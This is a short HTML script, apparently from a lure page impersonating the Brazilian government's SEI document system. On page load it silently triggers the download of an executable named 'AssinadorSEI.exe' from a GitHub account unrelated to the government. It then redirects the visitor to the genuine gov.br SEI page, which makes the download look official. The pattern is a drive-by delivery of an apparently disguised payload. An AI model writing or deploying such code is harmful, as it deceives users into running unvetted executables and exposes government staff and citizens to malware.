<script>
    window.onload = function () {
        // Inicia o download
        const link = document.createElement("a");
        link.href = "https://github.com/ftp-sei/ftp-sei.github.io/releases/download/main/AssinadorSEI.exe";
        link.download = "AssinadorSEI.exe";
        document.body.appendChild(link);
        link.click();
        link.remove();

        // Abre/redireciona após iniciar o download
        setTimeout(() => {
            window.location.href = "https://www.gov.br/servicoscompartilhados/pt-br/assuntos/gestao-documental/sistema-eletronico-de-informacoes-sei";
        }, 1000);
    };
</script>
